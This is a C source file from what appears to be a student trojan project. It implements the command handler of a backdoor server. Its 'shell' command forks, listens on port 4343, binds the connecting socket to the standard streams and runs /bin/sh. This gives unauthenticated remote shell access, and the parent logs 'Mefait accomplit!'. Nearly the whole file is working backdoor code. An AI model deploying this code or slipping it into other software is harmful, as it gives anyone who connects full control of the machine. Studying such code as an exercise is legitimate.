/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_command.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
/*   Updated: 2019/11/14 19:40:01 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "server.h"

extern char **environ;

static t_bool	server_cmd_help(t_client *client, t_server *server)
{
	if (!server || !client)
		return (false);
	send_text(HELP_CONTENT, client->socket);
	return (true);
}

static t_bool	server_cmd_shell(t_client *client, t_server *server)
{
	t_server	remote_shell;
	pid_t		pid;
	char		*sh[] = { "/bin/sh", NULL };

	if (!server || !client)
		return (false);
	if ((pid = fork()) < 0)
	{
		send_text("The remote shell has failed.\n", client->socket);
		durex_log("The remote shell has failed.\n", LOG_WARNING);
		return (false);
	}
	// Child
	else if (pid == 0)
	{
		close(server->srv_sock);
		create_server(&remote_shell, 4343, 1);
		remote_shell.shell = true;
		new_client(&remote_shell);
		t_client *clt = (t_client*)remote_shell.client_lst->content;
		dup2(clt->socket, 0);
		dup2(clt->socket, 1);
		dup2(clt->socket, 2);
		execve(sh[0], sh, environ);
	}
	// Father
	else
	{
		send_text("\033[31mSpawning shell\033[0m\n", client->socket);
		durex_log("Mefait accomplit!\n", LOG_INFO);
	}
	return (true);
}

static t_bool	server_cmd_exit(t_client *client, t_server *server)
{
	if (!server || !client)
		return (false);
	deco_client(client, server);
	return (true);
}

static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
{
 [HELP] = {"help\n", server_cmd_help},
 [HELP_ALIAS] = {"?\n", server_cmd_help},
 [SHELL] = {"shell\n", server_cmd_shell},
 [EXIT] = {"exit\n", server_cmd_exit},
};

void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client)
{
	// Dispatcher
	t_server_cmd cmd = -1;
	while (++cmd < SERVER_CMD_NUMBER)
	{
		if (!ft_strncmp(g_server_cmd[cmd].name, raw_cmd, cmd_size))
			g_server_cmd[cmd].func(client, server);
	}

	// server log and prompt client
	durex_log_with(raw_cmd, LOG_INFO, client_prefix, client);
	send_text(SERVER_PROMPT, client->socket);
}
